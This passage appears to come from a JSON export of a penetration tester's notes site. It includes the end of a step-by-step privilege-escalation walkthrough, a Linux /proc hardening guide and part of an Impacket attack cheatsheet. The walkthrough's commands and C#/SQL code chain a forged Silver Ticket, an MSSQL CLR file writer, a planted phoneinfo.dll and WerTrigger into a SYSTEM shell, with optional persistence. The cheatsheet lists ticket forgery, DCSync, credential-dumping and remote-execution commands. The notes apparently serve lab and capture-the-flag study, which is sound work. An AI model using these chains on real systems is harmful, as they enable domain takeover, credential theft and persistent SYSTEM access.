<code>phoneinfo.dll</code> from <code>System32</code> during report processing — same missing-DLL pattern as USO.</p>\n<p><strong>Steps</strong></p>\n<ol>\n<li>Clone <a href=\"https://github.com/sailay1996/WerTrigger\"><code>sailay1996/WerTrigger</code></a>.</li>\n<li>Drop <code>phoneinfo.dll</code> into <code>C:\\Windows\\System32\\</code>.</li>\n<li>Place <code>Report.wer</code> and <code>WerTrigger.exe</code> in the same directory on the target.</li>\n<li>Run <code>WerTrigger.exe</code> → SYSTEM shell.</li>\n</ol>\n<p>Useful when DiagHub/USO are patched — WER's plugin DLL surface has historically been slower to harden.</p>\n<hr>\n<h2 id=\"5-wermgr-privileged-directory-creation\">5 // WerMgr (Privileged Directory Creation)</h2>\n<p>Different primitive class: this one converts <strong>directory creation</strong> (not file write) into SYSTEM. <code>wermgr.exe</code> honours a sibling <code>wermgr.exe.local</code> directory for SxS redirection — if it exists and contains a planted DLL with the right name, <code>wermgr.exe</code> loads it under SYSTEM.</p>\n<p><strong>Steps</strong></p>\n<ol>\n<li>Clone <a href=\"https://github.com/binderlabs/DirCreate2System\"><code>binderlabs/DirCreate2System</code></a>.</li>\n<li>Create directory <code>C:\\Windows\\System32\\wermgr.exe.local\\</code> (this is the privileged action your bug provides).</li>\n<li>Loosen its ACL so the launcher can drop the payload:</li>\n</ol>\n<p><code>cacls C:\\Windows\\System32\\wermgr.exe.local /e /g everyone:f</code></p>\n<ol start=\"4\">\n<li>Place <code>spawn.dll</code> and <code>dircreate2system.exe</code> in the same directory and run <code>.\\dircreate2system.exe</code>.</li>\n</ol>\n<p>This is the technique to reach for when your bug grants <code>CreateDirectory</code> rights but no actual file content control.</p>\n<hr>\n<h2 id=\"6-choosing-the-right-technique\">6 // Choosing the Right Technique</h2>\n<table>\n<thead>\n<tr>\n<th>Primitive you have</th>\n<th>Use</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Arbitrary file write into <code>System32</code></td>\n<td><strong>DiagHub</strong> (legacy) → <strong>UsoDllLoader</strong> → <strong>WerTrigger</strong> in that order, falling back as patches close each one.</td>\n</tr>\n<tr>\n<td>Privileged directory creation only</td>\n<td><strong>WerMgr</strong> (<code>wermgr.exe.local</code> SxS trick).</td>\n</tr>\n<tr>\n<td>MSSQL Token B + write ACL on <code>\\\\&lt;host&gt;\\C$</code></td>\n<td>Same as row 1, but the upload happens server-side via <code>BACKUP</code>/CLR — see Section 7.</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"7-delivery-via-mssql-token-b\">7 // Delivery via MSSQL Token B</h2>\n<p>The only non-obvious part of chaining MSSQL into this is <strong>how to land arbitrary bytes</strong> in <code>System32</code>. Token B controls <em>who</em> the engine writes as (MSSQL Engine Identity vs Child Process Identity); the SQL surface controls <em>what shape</em> the bytes can take.</p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Bytes you can write</th>\n<th>Use for</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>BACKUP DATABASE … TO DISK = '\\\\host\\C$\\…'</code></td>\n<td>SQL backup format only (MTF header, not <code>MZ</code>). Cannot directly produce a valid DLL.</td>\n<td>Dropping decoys, log poisoning, or backups for offline parsing — <strong>not</strong> DLL planting.</td>\n</tr>\n<tr>\n<td><code>CREATE ASSEMBLY FROM 0x… ; BACKUP</code> of CLR proc</td>\n<td>Engine bytes mediated by CLR — runs in process, can call <code>File.WriteAllBytes</code> while impersonating Token B.</td>\n<td><strong>The viable path</strong>: the assembly itself writes raw bytes to <code>System32</code>. Requires <code>TRUSTWORTHY ON</code> or signed assembly.</td>\n</tr>\n<tr>\n<td><code>OPENROWSET(BULK …) … OUTPUT</code> (no native write)</td>\n<td>None — OPENROWSET BULK is read-side only.</td>\n<td>Reading existing files only.</td>\n</tr>\n<tr>\n<td><code>xp_cmdshell</code> / <code>sp_OACreate</code> filesystem</td>\n<td>Arbitrary, but spawned child runs under <strong>Token A</strong> (MSSQL Engine Identity vs Child Process Identity).</td>\n<td>Useless if the goal is to escape a stripped service account.</td>\n</tr>\n</tbody>\n</table>\n<p><strong>The honest chain</strong> with a Silver Ticket on a stripped <code>mssqlsvc</code>:</p>\n<pre><code>NT hash of mssqlsvc\n   │\n   ▼  Silver Ticket — PAC = Domain Admins + S-1-5-32-544\nMSSQL session, Token B = DA\n   │\n   ▼  CREATE ASSEMBLY FROM 0x... (loaded as UNSAFE)\n   ▼  EXEC clr_writefile @path='\\\\host\\C$\\Windows\\System32\\phoneinfo.dll', @bytes=0x4D5A...\nDLL planted via the engine impersonating DA on the SMB write\n   │\n   ▼  Trigger (WerTrigger.exe / usoclient StartInteractiveScan / diaghub.exe)\nNT AUTHORITY\\SYSTEM\n</code></pre>\n<p>The CLR procedure runs <em>inside</em> <code>sqlservr.exe</code>, so its <code>WriteAllBytes</code> inherits Token B at the I/O — same impersonation rule that makes <code>OPENROWSET BULK</code> reads work. The DLL drop is therefore evaluated against the PAC, not against the stripped service token.</p>\n<hr>\n<h2 id=\"8-complete-walkthrough-wertrigger-via-mssql-token-b\">8 // Complete Walkthrough // WerTrigger via MSSQL Token B</h2>\n<p>End-to-end commands for the chain <code>Silver Ticket → MSSQL CLR write → WerTrigger → SYSTEM</code>. Assumes you already have a <code>sysadmin</code> session via the forged Silver Ticket flow.</p>\n<h3 id=\"step-1-build-the-clr-file-writer-helper\">Step 1 // Build the CLR file-writer helper</h3>\n<p>Minimal C# wrapper around <code>File.WriteAllBytes</code>. Compile on the attacker box:</p>\n<pre><code class=\"language-csharp\">// FileWriter.cs\nusing System.IO;\nusing Microsoft.SqlServer.Server;\n\npublic class Writer\n{\n    [SqlProcedure]\n    public static void WriteBytes(string path, byte[] bytes)\n    {\n        File.WriteAllBytes(path, bytes);\n    }\n}\n</code></pre>\n<pre><code class=\"language-bash\"># Kali has mono-mcs; alternatively use Windows csc.exe\nmcs -target:library -r:/usr/lib/mono/4.5/Microsoft.SqlServer.Types.dll \\\n    -out:FileWriter.dll FileWriter.cs\n\n# If the SqlServer.Server reference is missing, stub it:\n#   public class SqlProcedureAttribute : System.Attribute {}\n# and remove the -r:.\n</code></pre>\n<h3 id=\"step-2-convert-every-binary-you-need-into-hex-literals\">Step 2 // Convert every binary you need into hex literals</h3>\n<pre><code class=\"language-bash\"># Helper: produce a 0x… literal ready for T-SQL\nhexify() { printf '0x'; xxd -p &quot;$1&quot; | tr -d '\\n'; echo; }\n\nhexify FileWriter.dll          &gt; FileWriter.hex\nhexify phoneinfo.dll           &gt; phoneinfo.hex     # from sailay1996/WerTrigger\nhexify WerTrigger.exe          &gt; wertrigger.hex\nhexify Report.wer              &gt; report.hex\n</code></pre>\n<p>Each <code>.hex</code> file now holds a single <code>0x4D5A…</code> literal you paste into the SQL below.</p>\n<h3 id=\"step-3-server-configuration\">Step 3 // Server configuration</h3>\n<p>Connect with the Silver-Ticket-authenticated session:</p>\n<pre><code class=\"language-bash\">export KRB5CCNAME=$(pwd)/doesntmatter.ccache\nttylog-wrap mssql-DC01 impacket-mssqlclient -k DC01.signed.htb -windows-auth\n</code></pre>\n<p>Then in the MSSQL prompt:</p>\n<pre><code class=\"language-sql\">EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'clr enabled', 1; RECONFIGURE;\nEXEC sp_configure 'clr strict security', 0; RECONFIGURE;   -- SQL Server 2017+\nALTER DATABASE master SET TRUSTWORTHY ON;\nUSE master;\n</code></pre>\n<h3 id=\"step-4-register-the-clr-writer\">Step 4 // Register the CLR writer</h3>\n<pre><code class=\"language-sql\">-- Idempotent cleanup\nIF OBJECT_ID('dbo.WriteFileBytes') IS NOT NULL DROP PROCEDURE dbo.WriteFileBytes;\nIF EXISTS (SELECT 1 FROM sys.assemblies WHERE name = 'FileWriter')\n    DROP ASSEMBLY FileWriter;\n\nCREATE ASSEMBLY FileWriter\nFROM 0x4D5A90000300000004000000FFFF0000B8000000…   -- paste FileWriter.hex\nWITH PERMISSION_SET = UNSAFE;\n\nCREATE PROCEDURE dbo.WriteFileBytes\n    @path  NVARCHAR(260),\n    @bytes VARBINARY(MAX)\nAS EXTERNAL NAME FileWriter.[Writer].WriteBytes;\n</code></pre>\n<h3 id=\"step-5-drop-the-three-files-in-their-target-locations\">Step 5 // Drop the three files in their target locations</h3>\n<p><code>phoneinfo.dll</code> <strong>must</strong> land in <code>System32</code>. <code>WerTrigger.exe</code> and <code>Report.wer</code> must end up in the <strong>same directory</strong> as each other — <code>C:\\Windows\\Temp</code> works.</p>\n<pre><code class=\"language-sql\">-- 1. The hijacked DLL — written under Token B (Domain Admin in the PAC)\nEXEC dbo.WriteFileBytes\n     @path  = N'C:\\Windows\\System32\\phoneinfo.dll',\n     @bytes = 0x4D5A90000300…;          -- paste phoneinfo.hex\n\n-- 2. The trigger binary\nEXEC dbo.WriteFileBytes\n     @path  = N'C:\\Windows\\Temp\\WerTrigger.exe',\n     @bytes = 0x4D5A90000300…;          -- paste wertrigger.hex\n\n-- 3. The crafted crash report consumed by WerTrigger\nEXEC dbo.WriteFileBytes\n     @path  = N'C:\\Windows\\Temp\\Report.wer',\n     @bytes = 0x3C3F786D6C…;            -- paste report.hex\n</code></pre>\n<p>Each <code>EXEC</code> returns <code>Commands completed successfully.</code> if Token B carries the SIDs from Section 6. If you get <code>Access to the path … is denied</code>, your PAC is missing <code>S-1-5-32-544</code> — re-forge with <code>-extra-sid 'S-1-5-32-544'</code>.</p>\n<h3 id=\"step-6-trigger\">Step 6 // Trigger</h3>\n<p>WerFault.exe runs as SYSTEM regardless of who launched the trigger, so <code>xp_cmdshell</code> (Token A, stripped) is fine here — we only need to <em>start</em> <code>WerTrigger.exe</code>, not write privileged files with it.</p>\n<pre><code class=\"language-sql\">EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'cd /d C:\\Windows\\Temp &amp;&amp; WerTrigger.exe';\n</code></pre>\n<p>The planted <code>phoneinfo.dll</code> is loaded inside the SYSTEM-context <code>WerFault.exe</code> and detonates its <code>DllMain</code> payload (typically a reverse shell baked into the DLL at build time).</p>\n<h3 id=\"step-7-cleanup\">Step 7 // Cleanup</h3>\n<pre><code class=\"language-sql\">DROP PROCEDURE dbo.WriteFileBytes;\nDROP ASSEMBLY  FileWriter;\nALTER DATABASE master SET TRUSTWORTHY OFF;\nEXEC sp_configure 'clr strict security', 1; RECONFIGURE;\nEXEC sp_configure 'clr enabled', 0;          RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0;          RECONFIGURE;\n</code></pre>\n<p><code>phoneinfo.dll</code> itself can be left in <code>System32</code> if persistence is desired (WerFault re-uses it on every crash) or removed via the same <code>WriteFileBytes</code>-style helper inverted into a delete primitive.</p>\n<hr>\n<h2 id=\"9-tldr\">9 // TL;DR</h2>\n<ul>\n<li>Privileged file write → SYSTEM RCE is a <strong>DLL-planting problem</strong>: pick a SYSTEM process that loads a missing/hijackable DLL by name from <code>System32</code>.</li>\n<li><strong>DiagHub</strong> (legacy), <strong>UsoDllLoader</strong> (mainstream), <strong>WerTrigger</strong> (fallback) all convert <em>file write</em>; <strong>WerMgr</strong> converts <em>directory creation</em>.</li>\n<li>The actual write can come from any vulnerability — but if MSSQL is the source, <strong>don't use <code>BACKUP DATABASE</code></strong> to drop the DLL (wrong file format). Use a <strong>CLR procedure under Token B</strong> to write raw bytes; pure <code>BACKUP</code> only writes SQL backup format. See MSSQL Engine Identity vs Child Process Identity for the surrounding identity model.</li>\n<li>None of these tricks need user interaction; all four end at NT AUTHORITY\\SYSTEM.</li>\n</ul>",
      "snippet": "NT hash of mssqlsvc\n   │\n   ▼  Silver Ticket — PAC = Domain Admins + S-1-5-32-544\nMSSQL session, Token B = DA",
      "foot": "/notes/Privileged File Write to SYSTEM RCE.md"
    },
    {
      "title": "Process Hardening — hidepid and argv masking",
      "slug": "process-hardening-hidepid-and-argv-masking",
      "date": "2026·03·10",
      "tags": [
        "hardening",
        "linux",
        "defense",
        "proc"
      ],
      "desc": "Context On Linux, /proc exposes every user's processes by default. Any local user can read arguments, environment variables, and memory maps of any process. Tools like pspy, ps -ef, cat /proc/PID/cmdline exploit this visibility to intercept credentials passed as process…",
      "body": "<h1 id=\"process-hardening-countermeasures-to-process-snooping\">Process Hardening // Countermeasures to Process Snooping</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nOn Linux, <code>/proc</code> exposes every user's processes by default. Any local user can read arguments, environment variables, and memory maps of any process. Tools like <code>pspy</code>, <code>ps -ef</code>, <code>cat /proc/PID/cmdline</code> exploit this visibility to intercept credentials passed as process arguments.</p>\n<p>Real-world example: Codify_EN — <code>mysqldump -p\"password\"</code> executed as root exposes the password to any local user.</p>\n</blockquote>\n<hr>\n<h2 id=\"1-the-problem-process-snooping\">1 // The Problem: Process Snooping</h2>\n<h3 id=\"why-it-works\">Why it works</h3>\n<p>When a program is executed, the kernel writes its arguments (<code>argv</code>) to <code>/proc/PID/cmdline</code>. This file is readable by <strong>all users</strong> by default.</p>\n<pre><code class=\"language-bash\"># Any user can do this:\nps -ef | grep mysql\n# root  12345  mysqldump -u root -pSuperSecret123 --all-databases\n\ncat /proc/12345/cmdline | tr '\\0' ' '\n# mysqldump -u root -pSuperSecret123 --all-databases\n</code></pre>\n<h3 id=\"how-pspy-exploits-this\">How pspy exploits this</h3>\n<p><code>pspy</code> uses <code>inotify</code> on <code>/proc</code> to receive notifications when a new process is created. As soon as the kernel writes the PID, pspy reads <code>/proc/PID/cmdline</code> and captures the arguments <strong>before the process terminates or masks them</strong>.</p>\n<pre><code># Typical pspy output:\nCMD: UID=0 /usr/bin/mysqldump -u root -pSuperSecret123 --all-databases\n</code></pre>\n<hr>\n<h2 id=\"2-countermeasure-hidepid\">2 // Countermeasure: hidepid</h2>\n<h3 id=\"what-it-does\">What it does</h3>\n<p>The <code>hidepid</code> option on the <code>/proc</code> filesystem controls process visibility between users.</p>\n<table>\n<thead>\n<tr>\n<th>Value</th>\n<th>Effect</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>hidepid=0</code></td>\n<td>Default — everyone sees all processes</td>\n</tr>\n<tr>\n<td><code>hidepid=1</code></td>\n<td>Users see other PIDs but not their details (<code>cmdline</code>, <code>environ</code>, <code>maps</code>)</td>\n</tr>\n<tr>\n<td><code>hidepid=2</code></td>\n<td>Users see <strong>only their own processes</strong> — other users' <code>/proc/PID/</code> is inaccessible</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"apply-temporarily-immediate-does-not-persist-across-reboot\">Apply temporarily (immediate, does not persist across reboot)</h3>\n<pre><code class=\"language-bash\">sudo mount -o remount,hidepid=2 /proc\n</code></pre>\n<h3 id=\"apply-permanently-persists-across-reboot\">Apply permanently (persists across reboot)</h3>\n<pre><code class=\"language-bash\"># /etc/fstab // add or modify the /proc line:\nproc    /proc    proc    defaults,hidepid=2    0    0\n</code></pre>\n<h3 id=\"verification\">Verification</h3>\n<pre><code class=\"language-bash\"># As a non-root user:\nps aux\n# Shows only own processes\n\nls /proc/ | grep -E '^[0-9]+$' | wc -l\n# Only own PIDs\n\ncat /proc/1/cmdline\n# cat: /proc/1/cmdline: Permission denied\n</code></pre>\n<h3 id=\"impact-on-pspy\">Impact on pspy</h3>\n<p>With <code>hidepid=2</code>, <code>pspy</code> <strong>can no longer read</strong> <code>/proc/PID/cmdline</code> of root processes. The process snooping attack is completely neutralized.</p>\n<blockquote>\n<p><strong>Limitation</strong><br>\n<code>hidepid</code> does not protect processes from the <strong>same user</strong>. If an attacker obtains a shell as the same UID running the command, they will still see the arguments. Defense must be layered.</p>\n</blockquote>\n<hr>\n<h2 id=\"3-countermeasure-argv-masking\">3 // Countermeasure: argv masking</h2>\n<h3 id=\"the-concept\">The concept</h3>\n<p>Some programs overwrite <code>argv</code> in memory after startup to hide sensitive arguments. The <code>argv</code> memory area is modifiable by the process itself — by overwriting the bytes, the content visible in <code>/proc/PID/cmdline</code> changes.</p>\n<h3 id=\"example-mysql-behavior\">Example: MySQL behavior</h3>\n<pre><code class=\"language-bash\"># Original command:\nmysql -u root -pSuperSecret123\n\n# What ps shows after argv masking:\nmysql -u root -pxxxxxxxxxxxxxxx\n</code></pre>\n<p>MySQL reads the password from <code>argv[2]</code>, stores it internally, then overwrites the bytes with <code>x</code>. This happens <strong>after</strong> the process has started — there is a time window where the password is visible in cleartext.</p>\n<h3 id=\"c-demo\">C demo</h3>\n<pre><code class=\"language-c\">// argv_mask_demo.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char *argv[]) {\n    printf(&quot;PID: %d\\n&quot;, getpid());\n    printf(&quot;Original arguments:\\n&quot;);\n    for (int i = 0; i &lt; argc; i++)\n        printf(&quot;  argv[%d] = %s\\n&quot;, i, argv[i]);\n\n    // Masking: overwrite every argument with 'X'\n    for (int i = 1; i &lt; argc; i++)\n        memset(argv[i], 'X', strlen(argv[i]));\n\n    printf(&quot;Arguments masked. Verify with:\\n&quot;);\n    printf(&quot;  cat /proc/%d/cmdline | tr '\\\\0' ' '\\n&quot;, getpid());\n\n    // Keep process alive for inspection\n    pause();\n    return 0;\n}\n</code></pre>\n<pre><code class=\"language-bash\">gcc -o argv_mask_demo argv_mask_demo.c\n./argv_mask_demo password123 secret &amp;\n</code></pre>\n<pre><code class=\"language-bash\"># Before masking (time window):\ncat /proc/$(pgrep argv_mask)/cmdline | tr '\\0' ' '\n# ./argv_mask_demo password123 secret\n\n# After masking:\ncat /proc/$(pgrep argv_mask)/cmdline | tr '\\0' ' '\n# ./argv_mask_demo XXXXXXXXXXX XXXXXX\n</code></pre>\n<h3 id=\"race-condition\">Race condition</h3>\n<blockquote>\n<p><strong>Why argv masking is not enough</strong><br>\nMasking happens <strong>after</strong> <code>execve()</code>. Between the moment the kernel creates the process and the moment userspace code overwrites <code>argv</code>, there is a time window. <code>pspy</code> with <code>inotify</code> reads <code>/proc/PID/cmdline</code> within this window, capturing the original arguments.</p>\n<p>Timeline:\n<code>execve()            → kernel writes argv to /proc/PID/cmdline\n  ↓ (window)         → pspy reads cmdline → password in cleartext\nmain() → memset()   → argv overwritten with 'X'\n  ↓                  → ps/cat now show 'XXXXXXX'</code></p>\n<p>Argv masking reduces the exposure window but <strong>does not eliminate it</strong>.</p>\n</blockquote>\n<hr>\n<h2 id=\"4-best-practice-never-pass-credentials-as-arguments\">4 // Best Practice: Never Pass Credentials as Arguments</h2>\n<p>The correct defense eliminates the problem at the root: credentials must never appear in <code>argv</code>.</p>\n<h3 id=\"mysqlmariadb-configuration-file\">MySQL/MariaDB // configuration file</h3>\n<pre><code class=\"language-ini\"># ~/.my.cnf (permissions: 600)\n[client]\nuser=root\npassword=SuperSecret123\n</code></pre>\n<pre><code class=\"language-bash\">chmod 600 ~/.my.cnf\nmysqldump --all-databases    # reads credentials from file\n</code></pre>\n<p>No <code>-p</code> argument in the process — nothing to read from <code>/proc/PID/cmdline</code>.</p>\n<h3 id=\"environment-variables-use-with-caution\">Environment variables (use with caution)</h3>\n<pre><code class=\"language-bash\">export MYSQL_PWD='SuperSecret123'\nmysqldump -u root --all-databases\n</code></pre>\n<blockquote>\n<p><strong><code>/proc/PID/environ</code> is readable with the same permissions as <code>cmdline</code>. With <code>hidepid=0</code>, environment variables are exposed the same way. Prefer configuration files.</strong>  </p>\n</blockquote>\n<h3 id=\"bash-scripts-read-from-file-not-from-argument\">Bash scripts // read from file, not from argument</h3>\n<pre><code class=\"language-bash\"># Wrong:\nDB_PASS=$(/usr/bin/cat /root/.creds)\nmysqldump -u root -p&quot;$DB_PASS&quot; --all-databases\n\n# Correct:\nmysqldump --defaults-file=/root/.my.cnf --all-databases\n</code></pre>\n<hr>\n<h2 id=\"5-hardening-checklist\">5 // Hardening Checklist</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Enable <code>hidepid=2</code> on <code>/proc</code> in <code>/etc/fstab</code></li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Verify no scripts pass credentials as process arguments</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Replace <code>-p\"password\"</code> with <code>--defaults-file</code> or <code>~/.my.cnf</code> for MySQL</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Set <code>600</code> permissions on all files containing credentials</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Quote variables in bash comparisons: <code>\"$a\" == \"$b\"</code></li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Verify with <code>ps auxwwe</code> and <code>pspy</code> that no process leaks secrets</li>\n</ul>",
      "snippet": "# Any user can do this:\nps -ef | grep mysql\n# root  12345  mysqldump -u root -pSuperSecret123 --all-databases\n",
      "foot": "/notes/Process Hardening.md"
    }
  ],
  "cheatsheets": [
    {
      "title": "Impacket Suite // Cheatsheet",
      "slug": "impacket-suite-cheatsheet",
      "date": "",
      "tags": [],
      "desc": "Protocol-level Windows/AD attack toolkit. Binary prefix: impacket-&lt;toolname&gt; — never &lt;toolname&gt;.py.",
      "body": "<h1 id=\"impacket-suite-cheatsheet\">Impacket Suite // Cheatsheet</h1>\n<blockquote>\n<p>Protocol-level Windows/AD attack toolkit.\nBinary prefix: <code>impacket-&lt;toolname&gt;</code> — never <code>&lt;toolname&gt;.py</code>.</p>\n</blockquote>\n<h2 id=\"authentication-formats\">Authentication Formats</h2>\n<pre><code class=\"language-bash\">DOMAIN/user:password@target\nDOMAIN/user@target -hashes :NTLMhash          # pass-the-hash\nDOMAIN/user@target -k -no-pass                # Kerberos (KRB5CCNAME must be set)\n</code></pre>\n<hr>\n<h2 id=\"kerberos\">Kerberos</h2>\n<h3 id=\"impacket-gettgt\">impacket-getTGT</h3>\n<p><strong>When</strong>: you have credentials or an NT hash and need a TGT ccache to feed other Kerberos-based tools (<code>-k</code>).</p>\n<pre><code class=\"language-bash\">impacket-getTGT DOMAIN/user:password -dc-ip DC_IP\nimpacket-getTGT DOMAIN/user -hashes :NTLMhash -dc-ip DC_IP\nexport KRB5CCNAME=user.ccache\n</code></pre>\n<hr>\n<h3 id=\"impacket-ticketer-silver-ticket\">impacket-ticketer // Silver Ticket</h3>\n<p><strong>When</strong>: you have the NT hash of a service account (MSSQL, CIFS, HTTP…) and want to forge a TGS locally — no KDC contact needed. Inject arbitrary group RIDs into the PAC (e.g. claim IT group membership → MSSQL sysadmin).</p>\n<pre><code class=\"language-bash\">impacket-ticketer \\\n  -nthash &lt;service_account_ntlm&gt; \\\n  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\\n  -domain DOMAIN \\\n  -spn MSSQLSvc/target.domain.local:1433 \\\n  -user-id 500 \\\n  -groups '512,&lt;GROUP_RID&gt;' \\\n  Administrator\n\nexport KRB5CCNAME=Administrator.ccache\n</code></pre>\n<blockquote>\n<p><code>-groups</code> injects group RIDs into the PAC. MSSQL maps Windows groups to SQL roles —\nadding the IT group RID grants sysadmin without touching the DC.</p>\n</blockquote>\n<hr>\n<h3 id=\"impacket-ticketer-golden-ticket\">impacket-ticketer // Golden Ticket</h3>\n<p><strong>When</strong>: you have the <code>krbtgt</code> NT hash (post-DCSync) and want persistent, domain-wide TGTs that survive user password resets.</p>\n<pre><code class=\"language-bash\">impacket-ticketer \\\n  -nthash &lt;krbtgt_ntlm&gt; \\\n  -domain-sid S-1-5-21-... \\\n  -domain DOMAIN \\\n  Administrator\n\nexport KRB5CCNAME=Administrator.ccache\n</code></pre>\n<hr>\n<h3 id=\"impacket-getnpusers-asreproast\">impacket-GetNPUsers // ASREPRoast</h3>\n<p><strong>When</strong>: enumerating AD with low-privilege or no credentials — find accounts with Kerberos pre-auth disabled and capture crackable AS-REP hashes offline.</p>\n<pre><code class=\"language-bash\"># No creds needed // supply user list from RID brute-force or LDAP\nimpacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -outputfile asrep.hash\n\n# With creds // auto-enumerates all vulnerable accounts\nimpacket-GetNPUsers DOMAIN/user:password -dc-ip DC_IP -request -outputfile asrep.hash\n\n# Crack\nhashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt\n</code></pre>\n<hr>\n<h3 id=\"impacket-getuserspns-kerberoast\">impacket-GetUserSPNs // Kerberoast</h3>\n<p><strong>When</strong>: you have any valid domain account — find service accounts with SPNs registered and request their TGS tickets for offline cracking.</p>\n<pre><code class=\"language-bash\">impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request -outputfile kerb.hash\n\n# Crack\nhashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt\n</code></pre>\n<hr>\n<h3 id=\"impacket-getst-s4u2self-s4u2proxy\">impacket-getST // S4U2Self / S4U2Proxy</h3>\n<p><strong>When</strong>: exploiting RBCD or Constrained Delegation — impersonate a privileged user (e.g. Administrator) against a target service using S4U extension.</p>\n<pre><code class=\"language-bash\"># RBCD: controlled machine account is set in msDS-AllowedToActOnBehalfOfOtherIdentity\nimpacket-getST \\\n  -spn cifs/target.domain.local \\\n  -impersonate Administrator \\\n  -dc-ip DC_IP \\\n  DOMAIN/controlled_machine$:password\n\nexport KRB5CCNAME=Administrator@cifs_target.ccache\n\n# Constrained delegation (service has msDS-AllowedToDelegateTo)\nimpacket-getST \\\n  -spn http/webserver.domain.local \\\n  -impersonate Administrator \\\n  -dc-ip DC_IP \\\n  DOMAIN/svc_account:password\n</code></pre>\n<hr>\n<h2 id=\"credential-dumping\">Credential Dumping</h2>\n<h3 id=\"impacket-secretsdump\">impacket-secretsdump</h3>\n<p><strong>When</strong>: you have local admin or replication rights — dump SAM/LSA remotely, or DCSync the entire NTDS without mounting volumes or dropping tools.</p>\n<pre><code class=\"language-bash\"># Remote SAM + LSA secrets (local admin on target)\nimpacket-secretsdump DOMAIN/user:password@target\n\n# DCSync // replicate NTDS without disk access (DA or replication rights)\nimpacket-secretsdump DOMAIN/user:password@DC_IP -just-dc\nimpacket-secretsdump DOMAIN/user:password@DC_IP -just-dc-user Administrator\nimpacket-secretsdump DOMAIN/user:password@DC_IP -just-dc-user krbtgt\n\n# Pass-the-hash\nimpacket-secretsdump DOMAIN/user@target -hashes :NTLMhash\n\n# Kerberos\nexport KRB5CCNAME=ticket.ccache\nimpacket-secretsdump -k DOMAIN/user@target -no-pass\n</code></pre>\n<hr>\n<h2 id=\"remote-execution\">Remote Execution</h2>\n<h3 id=\"impacket-psexec\">impacket-psexec</h3>\n<p><strong>When</strong>: you need a SYSTEM shell — fastest option when stealth is not a concern. Creates a temporary service and drops a binary to ADMIN$.</p>\n<pre><code class=\"language-bash\">impacket-psexec DOMAIN/user:password@target\nimpacket-psexec DOMAIN/user@target -hashes :NTLMhash\n</code></pre>\n<hr>\n<h3 id=\"impacket-wmiexec\">impacket-wmiexec</h3>\n<p><strong>When</strong>: you need a shell as the authenticating user (not SYSTEM) without creating services — more stealthy than psexec, output returned via SMB share.</p>\n<pre><code class=\"language-bash\">impacket-wmiexec DOMAIN/user:password@target\nimpacket-wmiexec DOMAIN/user@target -hashes :NTLMhash\n</code></pre>\n<hr>\n<h3 id=\"impacket-smbexec\">impacket-smbexec</h3>\n<p><strong>When</strong>: similar to psexec but avoids writing a binary to disk — executes via a named pipe. Useful when AV blocks dropped executables.</p>\n<pre><code class=\"language-bash\">impacket-smbexec DOMAIN/user:password@target\nimpacket-smbexec DOMAIN/user@target -hashes :NTLMhash\n</code></pre>\n<hr>\n<h3 id=\"impacket-atexec\">impacket-atexec</h3>\n<p><strong>When</strong>: you need a single command executed via Task Scheduler — no interactive shell, no service created. Good for blind execution or when other methods are blocked.</p>\n<pre><code class=\"language-bash\">impacket-atexec DOMAIN/user:password@target &quot;whoami &gt; C:\\output.txt&quot;\n</code></pre>\n<hr>\n<h2 id=\"smb-file-access\">SMB / File Access</h2>\n<h3 id=\"impacket-smbclient\">impacket-smbclient</h3>\n<p><strong>When</strong>: interactive SMB browsing — download/upload files and enumerate shares without a GUI.</p>\n<pre><code class=\"language-bash\">impacket-smbclient DOMAIN/user:password@target\nimpacket-smbclient DOMAIN/user@target -hashes :NTLMhash\n# Commands: shares, use &lt;SHARE&gt;, ls, get &lt;file&gt;, put &lt;file&gt;, cd &lt;dir&gt;\n</code></pre>\n<hr>\n<h3 id=\"impacket-smbserver\">impacket-smbserver</h3>\n<p><strong>When</strong>: receive files from a Windows target (PowerShell/certutil download) or capture NetNTLMv2 hashes passively without running Responder.</p>\n<pre><code class=\"language-bash\"># Anonymous (file transfer)\nimpacket-smbserver share /tmp/share -smb2support\n\n# Authenticated (prevents anonymous hash capture on modern systems)\nimpacket-smbserver share /tmp/share -smb2support -username user -password pass\n</code></pre>\n<hr>\n<h2 id=\"mssql\">MSSQL</h2>\n<h3 id=\"impacket-mssqlclient\">impacket-mssqlclient</h3>\n<p><strong>When</strong>: interactive MSSQL access — enumerate databases, test privilege levels, enable xp_cmdshell, or authenticate with a Silver Ticket via Kerberos.</p>\n<pre><code class=\"language-bash\"># Password\nimpacket-mssqlclient DOMAIN/user:password@target\n\n# Hash\nimpacket-mssqlclient DOMAIN/user@target -hashes :NTLMhash\n\n# Kerberos // Silver Ticket (bypasses KDC, presents ticket directly to MSSQL)\nexport KRB5CCNAME=Administrator.ccache\nimpacket-mssqlclient -k DOMAIN/Administrator@target 